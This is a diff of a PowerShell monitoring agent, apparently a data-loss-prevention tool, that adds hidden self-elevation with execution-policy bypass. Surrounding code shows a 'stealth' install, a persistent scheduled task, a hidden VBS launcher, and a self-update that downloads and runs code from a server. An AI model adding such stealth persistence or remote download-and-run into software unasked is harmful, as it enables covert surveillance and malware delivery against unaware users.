@@ -3,8 +3,23 @@ param(
     [switch]$Install
 )
 
-# Version: 1.6.6
+# Version: 1.6.7
 # Description: Extreme-Compat User-Mode Agent with stable ID detection.
+
+# 0. SELF-ELEVATION (Needed for Security Logs)
+$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $IsAdmin) {
+    try {
+        # Only attempt if we're not already in a recursive loop
+        if ($env:UEA_ELEVATED -ne "TRUE") {
+            $env:UEA_ELEVATED = "TRUE"
+            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
+            exit
+        }
+    } catch {
+        # If elevation fails (user clicks No), continue in limited mode
+    }
+}
 
 # 1. ENVIRONMENT SANITATION
 [Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12"
@@ -54,7 +69,7 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.6.6..."
+        Log-Message "Initiating User-Level Persistent Install v1.6.7..."
         $TaskName = "UEA_Support_Persistence"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
@@ -70,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.6" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "1.6.7" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -84,7 +99,7 @@ function Install-StealthAgent {
         Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
         
         Start-ScheduledTask -TaskName $TaskName | Out-Null
-        Log-Message "User-Mode v1.6.6 Active."
+        Log-Message "User-Mode v1.6.7 Active."
         if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
             exit
         }
@@ -115,7 +130,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.6.6 Started. ID: $AgentId"
+    Log-Message "Agent v1.6.7 Started (Admin=$IsAdmin). ID: $AgentId"
     
     # 5. DLP MONITORING STATE
     $KnownDrives = @()
@@ -228,7 +243,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.6")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.6.7")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
